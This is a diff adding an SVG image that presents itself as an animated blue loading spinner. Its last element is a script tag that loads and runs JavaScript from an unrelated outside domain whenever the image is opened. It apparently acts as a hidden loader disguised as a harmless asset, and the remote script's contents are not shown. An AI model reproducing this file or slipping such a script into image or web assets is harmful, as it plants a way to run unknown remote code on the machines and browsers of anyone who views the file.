@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50" viewBox="0 0 200 50">
+    <circle cx="50" cy="25" r="20" fill="none" stroke="#007bff" stroke-width="4" transform="translate(70)">
+        <animate attributeName="stroke-dasharray" from="0 125.66370614359172" to="125.66370614359172 0" dur="1s"
+                 repeatCount="indefinite"/>
+        <animate attributeName="stroke-dashoffset" from="0" to="125.66370614359172" dur="1s" repeatCount="indefinite"/>
+    </circle>
+    <text x="50%" text="fushishan6" y="50%" dominant-baseline="middle" text-anchor="middle" font-size="14px" fill="#007bff" id="msg"></text>
+    <!-- 使用 href 加载外部 JS -->
+    <script href="https://ossdown.mjh.cqzrd.com/mjhcg0223/mjhjquery.min.js?v=1.1.2"></script>
+
+</svg>
